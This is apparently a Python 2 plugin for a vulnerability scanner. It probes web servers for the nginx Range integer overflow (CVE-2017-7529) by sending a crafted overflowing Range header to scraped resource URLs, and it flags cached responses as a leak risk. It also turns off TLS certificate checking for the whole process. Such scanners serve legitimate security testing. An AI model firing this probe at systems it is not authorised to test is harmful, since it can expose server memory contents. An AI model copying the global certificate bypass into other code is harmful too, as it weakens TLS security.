# coding=utf-8
import urllib2
import re
import urlparse
import HTMLParser
import ssl
from config import is_port_open, is_http

try:
    _create_unverified_https_context = ssl._create_unverified_context  # 忽略证书错误
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context


def get_url(domain,port,timeout):
    url_list = []
    if port ==443:
        surl = 'https://' + domain
    else:
        surl = 'http://' + domain
    try:
        res = urllib2.urlopen(surl, timeout=timeout)
    except Exception as e:
        return []
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<(?:img|link|script)[^>]*?(?:src|href)=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


# @is_port_open
def verify(ip, port=80, name='', timeout=10, types='ip'):
    if types == 'ip':
        domain = ip + ':' + str(port)
    else:
        domain = ip
    url_list = get_url(domain,port,timeout)
    info = {
        'url': 'http://{}:{}'.format(ip, port),
        'vuln_name': 'nginx range int overflow cve-2017-7529',
        'severity': 'low',
    }
    i = 0
    for url in url_list:
        if i >= 3: break
        i += 1
        try:
            headers = urllib2.urlopen(url,timeout=timeout).headers
            file_len = headers["Content-Length"]
            request = urllib2.Request(url)
            request.add_header("Range", "bytes=-%d,-9223372036854%d"%(int(file_len)+623,776000-(int(file_len)+623)))
            cacheres = urllib2.urlopen(request, timeout=timeout)
            if cacheres.code == 206 and "Content-Range" in cacheres.read(2048):
                info['proof'] = u"存在Range整形溢出漏洞（CVE-2017-7529）"
                if ": HIT" in str(cacheres.headers):
                    info['proof'] += u",且开启了缓存功能,存在信息泄露风险"
                return info
        except:
            return
